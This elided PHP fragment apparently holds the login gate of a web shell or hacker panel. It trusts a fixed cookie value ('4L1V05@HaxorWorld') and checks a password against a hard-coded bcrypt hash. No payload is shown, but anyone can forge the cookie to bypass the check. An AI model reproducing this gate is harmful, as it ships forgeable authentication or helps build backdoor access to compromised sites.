...
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === '4L1V05@HaxorWorld'; 
}
...
if (is_logged_in()) {
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$06$w/FBSLAHZyZDPgJSTPwHw.2NDtbKeARYKiX0ZR05zwgzzqatDJLR2'; // https://bcrypt.online/
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', '4L1V05@HaxorWorld', time() + 3600, '/'); 
